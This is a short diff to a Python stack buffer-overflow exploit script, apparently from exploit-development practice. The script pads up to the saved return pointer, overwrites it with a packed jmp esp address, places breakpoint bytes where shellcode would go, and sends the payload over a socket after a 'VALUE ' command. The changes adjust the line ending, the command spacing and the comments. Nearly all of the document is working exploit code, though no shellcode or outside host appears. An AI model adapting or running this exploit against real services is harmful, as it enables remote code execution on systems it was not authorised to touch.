@@ -37,14 +37,14 @@ buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
 buf += struct.pack("<I",ptr_jmp_esp) #SRP overwrite using struct pack that does little endian work for me
 #buf += sub_esp_10 #ESP  points here
-buf += "\xCC\xCC\xCC\xCC" #ESP Poins here
+buf += "\xCC\xCC\xCC\xCC" #ESP Poins here | this is software breakpoint
 buf += "C"*(buf_totlen - len(buf)) #trailing padding
-buf += "\n"
+buf += "\r\n"
 
 #send the message
-s.send("VALUE" + buf)
+s.send("VALUE " + buf)
 
 #receive some data from socket
-data = s.recv(1024)
+s.recv(1024)
 
 s.close()
